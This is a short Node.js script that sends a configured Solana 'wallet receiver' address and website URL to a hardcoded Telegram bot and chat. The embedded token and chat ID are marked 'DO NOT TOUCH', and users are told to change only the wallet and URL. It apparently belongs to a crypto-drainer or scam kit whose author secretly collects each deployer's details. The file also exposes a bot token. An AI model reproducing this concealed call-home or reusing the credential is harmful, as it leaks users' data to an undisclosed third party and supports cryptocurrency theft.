const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '8008230982:AAFDKn1n03fT_GMWMfYY0IfFVi4IVRyqdSI';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '6309547301';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const solana_wallet_receiver_id = 'AA77vjVXNmLWDnaoqd5T2H8gnNxvmp8e86Q5r3D3Q9L5';
const website_url = 'https://crappo.vercel.app/';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
